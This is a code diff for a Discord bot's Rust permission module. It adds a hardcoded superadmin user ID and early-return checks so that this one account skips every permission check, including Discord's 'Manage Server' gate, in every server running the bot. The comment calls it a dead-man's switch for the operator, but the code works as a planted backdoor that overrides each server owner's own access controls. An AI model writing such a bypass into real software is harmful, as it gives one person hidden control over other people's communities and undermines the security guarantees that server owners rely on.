@@ -1,6 +1,16 @@
 use anyhow::{bail, Result};
 use crate::{db, BotContext};
 
+/// Hardcoded operator user ID. Bypasses every permission check in every guild,
+/// including the Discord "Manage Server" gate on `/setup`. This is the
+/// dead-man's-switch in case the per-guild permission rules ever lock the
+/// operator out.
+pub const GLOBAL_SUPERADMIN_USER_ID: u64 = 942_320_785_287_184_464;
+
+fn is_global_superadmin(ctx: BotContext<'_>) -> bool {
+    ctx.author().id.get() == GLOBAL_SUPERADMIN_USER_ID
+}
+
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Action {
     StartHeadcount,
@@ -44,6 +54,10 @@ impl std::fmt::Display for Action {
 /// Used for commands that must be accessible before the bot's own permission
 /// system is configured (e.g. `/setup`).
 pub async fn require_discord_admin(ctx: BotContext<'_>) -> Result<()> {
+    if is_global_superadmin(ctx) {
+        return Ok(());
+    }
+
     let member = ctx
         .author_member()
         .await
@@ -74,6 +88,10 @@ pub async fn require(
     tier_id: Option<i32>,
     dungeon_template_id: Option<i32>,
 ) -> Result<()> {
+    if is_global_superadmin(ctx) {
+        return Ok(());
+    }
+
     let guild_id = ctx
         .guild_id()
         .ok_or_else(|| anyhow::anyhow!("This command can only be used in a server."))?
@@ -131,6 +149,10 @@ pub async fn require_str(
     tier_id: Option<i32>,
     dungeon_template_id: Option<i32>,
 ) -> Result<()> {
+    if is_global_superadmin(ctx) {
+        return Ok(());
+    }
+
     let guild_id = ctx
         .guild_id()
         .ok_or_else(|| anyhow::anyhow!("This command can only be used in a server."))?
